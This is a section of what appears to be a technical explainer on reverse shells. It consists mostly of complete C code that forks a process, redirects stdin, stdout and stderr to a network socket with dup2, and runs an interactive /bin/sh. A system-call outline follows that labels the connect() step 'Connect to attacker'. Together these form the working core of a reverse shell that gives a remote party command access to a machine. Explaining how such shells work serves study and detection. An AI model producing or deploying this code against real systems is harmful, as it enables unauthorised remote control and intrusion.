## 2. I/O Redirection Mechanism

### 2.1 Complete Shell Implementation

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

int redirect_io_and_execute(int socket_fd) {
    pid_t pid;

    // Fork process
    pid = fork();

    if (pid == 0) {
        // Child process: redirect I/O

        // Redirect stdin (0) to socket
        dup2(socket_fd, STDIN_FILENO);

        // Redirect stdout (1) to socket
        dup2(socket_fd, STDOUT_FILENO);

        // Redirect stderr (2) to socket
        dup2(socket_fd, STDERR_FILENO);

        // Close original socket descriptor
        close(socket_fd);

        // Execute shell
        char *shell = "/bin/sh";
        char *args[] = {shell, "-i", NULL};

        execve(shell, args, NULL);

        // If execve fails
        perror("execve");
        exit(1);

    } else if (pid > 0) {
        // Parent process: wait for child
        waitpid(pid, NULL, 0);
        return 0;
    } else {
        perror("fork");
        return -1;
    }
}
```

**System call sequence:**
```
socket()          → Create network socket
connect()         → Connect to attacker
fork()            → Create child process
dup2(sock, 0)     → Redirect stdin
dup2(sock, 1)     → Redirect stdout
dup2(sock, 2)     → Redirect stderr
execve("/bin/sh") → Execute shell
```

